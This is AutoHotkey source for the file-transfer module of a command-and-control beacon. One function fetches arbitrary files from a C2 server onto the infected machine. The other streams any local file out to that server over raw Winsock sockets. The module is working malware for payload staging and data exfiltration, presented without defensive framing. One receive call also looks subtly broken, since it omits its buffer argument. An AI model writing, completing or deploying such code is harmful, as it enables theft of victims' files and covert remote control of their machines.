; ============================================================================
; FILE TRANSFER MODULE
; ============================================================================
; Handle file upload and download operations
; These methods should be added to the NetworkClient class
; ============================================================================

; Download a file from the C2 server to the beacon
HandleFileDownload(filename) {
    this.Log("Handling file download: " filename)
    local file := "", verifyFile := ""

    try {
        ; Initial request
        message := Format("to_beacon|{}", filename)
        this.Log("Sending file request: " message)

        ; Send the request and get file data
        response := this.SendMsg(this.serverIP, this.serverPort, message, 60000, true)

        ; Validate response
        if (!response || response.Size = 0) {
            throw Error("No data received from server")
        }

        ; Check for error response
        errorCheck := StrGet(response, 5, "UTF-8")
        if (errorCheck = "ERROR") {
            errorMsg := StrGet(response, response.Size, "UTF-8")
            throw Error("Server error: " errorMsg)
        }

        ; Write file
        try {
            ; Open file in binary write mode
            file := FileOpen(filename, "w-rwd")  ; Binary mode, write access
            if (!file) {
                throw Error("Could not create file: " filename)
            }

            ; Write data in chunks
            CHUNK_SIZE := 1048576  ; 1MB chunks
            totalWritten := 0

            while (totalWritten < response.Size) {
                remaining := response.Size - totalWritten
                writeSize := (remaining > CHUNK_SIZE) ? CHUNK_SIZE : remaining

                ; Create chunk buffer
                chunk := Buffer(writeSize, 0)
                DllCall("RtlCopyMemory",
                    "Ptr", chunk,
                    "Ptr", response.Ptr + totalWritten,
                    "UPtr", writeSize)

                ; Write chunk
                written := file.RawWrite(chunk, writeSize)
                if (written != writeSize) {
                    throw Error("Write failed: Wrote " . written . " of " . writeSize . " bytes")
                }

                totalWritten += written

                ; Log progress
                if (totalWritten >= 1048576) {
                    this.Log("Written " . Floor(totalWritten/1048576) . "MB")
                }
            }

            file.Close()
            file := ""

            ; Verify file size
            verifyFile := FileOpen(filename, "r-r")  ; Read mode
            if (!verifyFile) {
                throw Error("Could not verify file")
            }

            if (verifyFile.Length != response.Size) {
                verifyFile.Close()
                throw Error("File size mismatch: Expected " . response.Size . " got " . verifyFile.Length)
            }

            verifyFile.Close()
            verifyFile := ""

            ; Send single completion notification with shorter timeout
            try {
                this.SendMsg(this.serverIP, this.serverPort,
                    Format("download_complete|{}|{}", this.agentID, filename),
                    1000)  ; Very short timeout since we don't care about response
            } catch as err {
                ; If notification fails, log but don't fail the download
                this.Log("Warning: Could not send completion notification: " err.Message)
            }

            this.Log("File download complete: " filename)
            return true

        } catch as err {
            if (file) {
                file.Close()
            }
            if (verifyFile) {
                verifyFile.Close()
            }
            throw Error("File write error: " . err.Message)
        }

    } catch as err {
        this.Log("File download error: " . err.Message)
        ; Send failure notification with shorter timeout
        try {
            this.SendMsg(this.serverIP, this.serverPort,
                Format("download_failed|{}|{}", this.agentID, filename),
                5000,  ; 5 second timeout for failure message
                false)
        } catch {
            ; Ignore errors in failure notification
        }
        return false
    }
}

; Upload a file from the beacon to the C2 server
HandleFileUpload(filepath) {
    this.Log("Handling file upload: " filepath)

    try {
        if (!FileExist(filepath)) {
            this.Log("File not found error: " filepath)
            throw Error("File not found: " filepath)
        }

        SplitPath(filepath, &filename)

        ; First send the from_beacon command and wait for READY response
        message := Format("from_beacon|{}", filename)
        this.Log("Sending initial from_beacon command: " message)

        ; Create new socket for file transfer
        transfer_socket := DllCall("Ws2_32\socket",
            "Int", this.AF_INET,
            "Int", this.SOCK_STREAM,
            "Int", this.IPPROTO_TCP)

        if (transfer_socket = -1) {
            this.Log("Failed to create transfer socket")
            throw Error("Socket creation failed")
        }

        try {
            ; Connect socket
            sockaddr := Buffer(16, 0)
            NumPut("UShort", this.AF_INET, sockaddr, 0)
            NumPut("UShort", DllCall("Ws2_32\htons", "UShort", this.serverPort), sockaddr, 2)
            NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", this.serverIP), sockaddr, 4)

            if (DllCall("Ws2_32\connect",
                "Ptr", transfer_socket,
                "Ptr", sockaddr,
                "Int", 16) = -1) {
                throw Error("Connect failed: " DllCall("Ws2_32\WSAGetLastError"))
            }

            ; Send initial command
            messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
            StrPut(message, messageBytes, "UTF-8")

            this.Log("Sending command on transfer socket")
            DllCall("Ws2_32\send",
                "Ptr", transfer_socket,
                "Ptr", messageBytes,
                "Int", messageBytes.Size - 1,
                "Int", 0)

            ; Wait for READY
            this.Log("Waiting for READY response...")
            ready_buffer := Buffer(128, 0)
            ready_received := DllCall("Ws2_32\recv",
                "Ptr", transfer_socket,
                "Ptr", ready_buffer,
                "Int", 128,
                "Int", 0)

            if (ready_received <= 0) {
                throw Error("Failed to receive READY signal")
            }

            ready_response := StrGet(ready_buffer, ready_received, "UTF-8")
            this.Log("Received response: " ready_response)

            if (ready_response != "READY") {
                throw Error("Unexpected response: " ready_response)
            }

            ; Now send the file
            this.Log("Starting file transfer")
            file := FileOpen(filepath, "r")
            if (!IsObject(file)) {
                throw Error("Could not open file")
            }

            ; Send file data in chunks
            CHUNK_SIZE := 1048576  ; 1MB chunks
            bytes_sent := 0

            while (!file.AtEOF) {
                buff := Buffer(CHUNK_SIZE, 0)  ; Create buffer for this chunk
                bytes_read := file.RawRead(buff, CHUNK_SIZE)
                if (bytes_read = 0) {
                    break
                }

                sent := DllCall("Ws2_32\send",
                    "Ptr", transfer_socket,
                    "Ptr", buff.Ptr,
                    "Int", bytes_read,  ; Use actual bytes read
                    "Int", 0)

                if (sent = -1) {
                    throw Error("Send failed: " DllCall("Ws2_32\WSAGetLastError"))
                }

                bytes_sent += sent
                this.Log("Sent " bytes_sent " bytes")
            }

            file.Close()
            this.Log("File transfer complete. Total bytes sent: " bytes_sent)

            ; Get final response
            this.Log("Waiting for SUCCESS response")
            final_buffer := Buffer(128, 0)
            final_received := DllCall("Ws2_32\recv",
                "Ptr", transfer_socket,
                "Int", 128,
                "Int", 0)

            if (final_received > 0) {
                final_response := StrGet(final_buffer, final_received, "UTF-8")
                this.Log("Final response: " final_response)
                return final_response = "SUCCESS"
            }

            return true

        } finally {
            this.Log("Closing transfer socket")
            DllCall("Ws2_32\closesocket", "Ptr", transfer_socket)
        }

    } catch as err {
        this.Log("File upload error with details: " err.Message " " err.Line)
        return false
    }
}
